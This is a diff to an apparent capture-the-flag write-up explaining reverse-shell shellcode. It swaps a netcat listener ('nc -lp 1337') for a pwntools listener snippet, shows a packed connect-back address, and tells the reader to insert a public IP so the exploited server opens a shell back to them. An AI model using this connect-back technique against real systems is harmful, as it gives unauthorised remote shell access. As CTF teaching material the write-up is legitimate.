@@ -191,12 +191,21 @@ server:	db 0x02,0x00,0x05,0x39, 127,   0,   0,   1,0xa0,0x50,0x55,0x55,0x55,0x55
 ```
 
 Note that port ( 1337 in this example ) needs to be in **big endian** order.
-Now we can just start netcat server on specified port and check the result locally.
+Now we can just start raw tcp server on specified port and check the result locally.
+
 ```
-nc -lp 1337
+...
+os.system('nasm shellcode.asm')
+
+s = listen(1337)
+...
+c = s.wait_for_connection()
+c.interactive()
 ```
-After our shellcode gets executed we will have shell in our netcat window.
+Just remember to put **listen** before sending line to challenge's server and to **wait for sonnection** at the end of your sploit file.
+
+After our shellcode gets executed we will have shell.
 The only thing that is left to do is to put public ip into our code, make sure that the port is correctly forwarded, and send our exploit to challenge's server.
 You can then use ls and cat to acquire the flag.
 
-You can also put a write syscall after dup2 syscalls to make it more obvious that our shellcode has connected to our netcat server. But I will leave that part to the reader. When trying to do that remember that there is not much stack left for the shellcode.
+You can also put a write syscall after dup2 syscalls to make it more obvious that our shellcode has connected to our server. But I will leave that part to the reader.
